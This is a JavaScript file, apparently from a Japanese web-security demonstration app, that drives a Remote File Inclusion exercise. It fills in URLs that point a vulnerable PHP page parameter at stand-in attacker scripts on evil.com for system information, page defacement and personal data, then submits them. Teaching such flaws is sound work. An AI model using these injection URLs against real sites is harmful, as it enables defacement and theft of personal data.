(function(){
    "use strict";
  
    //Valiable
      let selectMethodMsg = {
        '1':"想定されたケースで外部ファイルを読み込み画面表示します",
        '2':"GETパラメータに攻撃者が用意した<span class='text-danger font-weight-bold'>システム情報を表示するスクリプトファイルを指定</span>します",
        '3':"GETパラメータに攻撃者が用意した<span class='text-danger font-weight-bold'>Webページを改竄するスクリプトファイルを指定</span>します",
        '4':"GETパラメータに攻撃者が用意した<span class='text-danger font-weight-bold'>個人情報表示スクリプトファイルを指定</span>します",
      };
  
    //Event
      $("select[name='method']").on("change", changeMethod);

      $("#send_button").on("click", clickSendButton);

    //Method

      function changeMethod(e){
        var mcode = $("select[name='method']").val();
        var domain = $("#server_name").val();
        $("#selectMsg").html(selectMethodMsg[mcode]);
        $("#mcode").val(mcode);
        //auto input
        switch(mcode){
          case "1":
            $("#user_browsing_url").val("//" + domain + "/front/RemoteFileInclusion.php?page=http://valune/include.php");
            break;
          case "2":
            $("#user_browsing_url").val("//" + domain + "/front/RemoteFileInclusion.php?page=http://evil.com/systeminfo.php");
            break;
          case "3":
            $("#user_browsing_url").val("//" + domain + "/front/RemoteFileInclusion.php?page=http://evil.com/falsification.php");
            break;
          case "4":
            $("#user_browsing_url").val("//" + domain + "/front/RemoteFileInclusion.php?page=http://evil.com/parsonaldata.php");
            break;
        }
      }

      function clickSendButton(){
        $("#form1").attr("action", $("#user_browsing_url").val());
        $("#form1").submit();

      }

      function scrollDown(){
        if($("#scroll_down").val() === "1"){
          $('html, body').animate({scrollTop:document.body.offsetHeight});
        }
      }
  
    //Init

      scrollDown();
  
  })();